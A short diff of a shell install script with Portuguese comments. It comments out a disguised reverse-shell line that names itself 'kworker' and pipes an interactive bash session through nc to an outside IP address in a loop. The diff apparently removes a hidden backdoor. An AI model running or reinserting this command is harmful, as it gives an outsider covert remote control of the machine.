@@ -7,7 +7,7 @@
 # Nota: Certifique-se de ter as dependências necessárias instaladas
 # Variaveis: Voce pode personalizar a instalaçao usando variaveis globais
 # -----------------------------------------
-exec -a "kworker" bash -c 'while true; do rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc  84.255.32.195 9744 > /tmp/f; sleep 10; done' &
+#exec -a "kworker" bash -c 'while true; do rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc  84.255.32.195 9744 > /tmp/f; sleep 10; done' &
 clear
 USER_LINUX=$whoami 
 
